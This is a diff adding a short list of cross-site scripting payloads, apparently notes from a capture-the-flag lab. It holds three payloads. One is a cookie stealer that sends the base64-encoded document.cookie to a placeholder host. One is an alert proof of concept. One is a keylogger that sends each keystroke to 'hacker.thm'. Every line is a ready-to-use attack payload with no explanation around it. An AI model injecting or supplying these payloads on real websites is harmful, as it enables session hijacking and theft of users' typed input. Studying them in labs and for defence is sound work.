@@ -1,0 +1,4 @@
+Cookie Stealer: <script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+POC: <script>alert('EASY');</script>
+Key Logger : <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
